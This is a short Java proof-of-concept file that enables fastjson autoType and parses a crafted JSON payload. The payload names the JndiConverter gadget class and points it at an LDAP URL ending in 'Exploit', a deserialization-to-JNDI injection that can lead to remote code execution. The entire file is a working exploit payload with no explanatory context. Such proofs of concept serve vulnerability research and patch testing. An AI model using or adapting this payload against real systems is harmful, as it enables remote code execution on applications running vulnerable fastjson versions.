import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class Poc_1 {
    public static void main(String args[]) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String text1 = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://localhost:1389/Exploit\"}";
        JSON.parseObject((text1));
    }
}
